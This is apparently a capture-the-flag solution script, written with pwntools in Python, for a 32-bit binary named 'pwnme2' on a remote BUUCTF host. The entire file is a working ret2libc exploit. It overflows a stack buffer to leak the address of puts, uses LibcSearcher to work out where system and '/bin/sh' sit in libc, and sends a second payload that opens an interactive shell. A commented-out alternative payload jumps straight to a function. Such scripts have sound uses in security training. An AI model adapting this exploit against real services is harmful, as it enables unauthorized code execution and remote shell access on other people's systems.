from pwn import *

context(log_level='debug')

#io=process("./pwnme2")
io=remote("node3.buuoj.cn",25706)
elf=ELF("./pwnme2")

io.recv()

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

main=0x80486f8

#pop_rdi_ret=0x400733

string=0x804A060

ret=0x80483f2

payload=b'A'*(0x6c+0x4)+p32(puts_plt)+p32(main)+p32(puts_got)

io.sendline(payload)

#io.recv()



io.recvuntil(b'\n')

puts=u32(io.recv(4))

print(hex(puts))

io.recv()

from LibcSearcher import *  

libc = LibcSearcher('puts',puts)  
#获取libc加载地址  
libc_base = puts - libc.dump('puts')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  

payload=b'A'*(0x6c+0x4)+p32(ret)+p32(system_addr)+p32(main)+p32(binsh_addr)

io.sendline(payload)

'''
func=0x80485cb

payload=b'A'*(0x6c+0x4)+p32(func)

io.sendline(payload)
'''
io.interactive()